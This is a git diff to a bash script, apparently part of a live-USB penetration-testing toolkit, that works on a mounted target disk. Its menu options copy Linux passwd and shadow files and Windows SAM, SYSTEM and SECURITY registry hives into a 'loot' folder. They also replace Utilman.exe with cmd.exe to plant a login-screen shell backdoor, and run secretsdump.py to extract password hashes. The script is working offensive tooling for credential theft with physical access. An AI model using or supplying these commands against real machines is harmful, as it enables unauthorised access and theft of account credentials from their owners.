@@ -19,6 +19,9 @@
 #  but can be run independantly.
 
 PART=
+LOOT_FOLDER=$([ -d /home/p4p1-live/loot ] && echo '/home/p4p1-live/loot' || echo '/tmp')
+
+echo $LOOT_FOLDER
 
 function banner() {
 	echo -e "\e[31m               .-')            .-. .-')                                 ('-.  _  .-')   \e[0m"
@@ -38,7 +41,7 @@ function linux_exp() {
         1 "dump passwd & shadow" \
         2 "chroot :)" \
         2>&1 >/dev/tty)
-        [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd /tmp/passwd; cp -r /mnt/etc/shadow /tmp/shadow)
+        [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd $LOOT_FOLDER/passwd; cp -r /mnt/etc/shadow $LOOT_FOLDER/shadow)
         [ $SEL = 2 ] && chroot /mnt
 
         echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of /tmp/ :)"
@@ -51,9 +54,9 @@ function windows_exp() {
         2 "swap cmd.exe and utilman.exe" \
         3 "secrets dump me baby right now" \
         2>&1 >/dev/tty)
-        [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM /tmp/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM /tmp/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY /tmp/SECURITY)
+        [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY)
         [ $SEL = 2 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
-        [ $SEL = 3 ] && secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > /tmp/secretsdump.log
+        [ $SEL = 3 ] && secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
 
         echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of /tmp/ :)"
 }
@@ -89,9 +92,9 @@ function list_hard_drives() {
 }
 
 if [ "$EUID" -ne 0 ]; then
-	banner
-	echo -e "\e[1;31m[!]\e[m Please enter the root password (default: p4p1)"
-	exec sudo bash "$0" "$@"
+    banner
+    echo -e "\e[1;31m[!]\e[m Please enter the root password (default: p4p1)"
+    exec sudo bash "$0" "$@"
 else
     export DIALOGRC="/etc/p3ng0s/dialogrc"
     list_hard_drives
